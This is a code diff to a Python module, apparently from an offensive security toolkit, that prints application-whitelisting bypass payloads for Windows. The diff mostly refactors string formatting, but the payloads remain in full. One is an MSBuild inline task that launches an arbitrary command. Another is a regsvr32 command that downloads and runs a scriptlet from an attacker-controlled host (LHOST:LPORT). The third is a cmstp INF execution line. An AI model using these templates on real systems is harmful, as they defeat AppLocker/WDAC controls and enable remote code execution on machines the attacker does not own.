@@ -1,6 +1,5 @@
-"""AppLocker/WDAC bypass via trusted binaries — MSBuild, regsvr32, CMSTP."""
+"""AppLocker/WDAC bypass via trusted binaries  -  MSBuild, regsvr32, CMSTP."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -21,7 +20,7 @@ def run(args: Any) -> int:
     print("[*] AppLocker/WDAC Bypass via Trusted Binaries")
 
     bypasses = {
-        "msbuild_inline_task": '''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+        "msbuild_inline_task": f'''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="Run"><ClassExample /></Target>
   <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
@@ -30,11 +29,11 @@ def run(args: Any) -> int:
       public class ClassExample : ITask {{
         public IBuildEngine BuildEngine {{ get; set; }}
         public ITaskHost HostObject {{ get; set; }}
-        public bool Execute() {{ Process.Start("{}"); return true; }}
+        public bool Execute() {{ Process.Start("{command}"); return true; }}
       }}
     ]]></Code></Task>
   </UsingTask>
-</Project>'''.format(command),
+</Project>''',
         "regsvr32_sct": '''regsvr32 /s /n /u /i:http://{}:{}/payload.sct scrobj.dll'''.format(
             lhost or "LHOST", lport),
         "cmstp_inf": '''cmstp.exe /ni /s C:\\Windows\\Temp\\bypass.inf''',
@@ -42,7 +41,7 @@ def run(args: Any) -> int:
     }
 
     for name, payload in bypasses.items():
-        print("\n[{}]".format(name))
+        print(f"\n[{name}]")
         print(payload[:200] + ("..." if len(payload) > 200 else ""))
 
     return 0
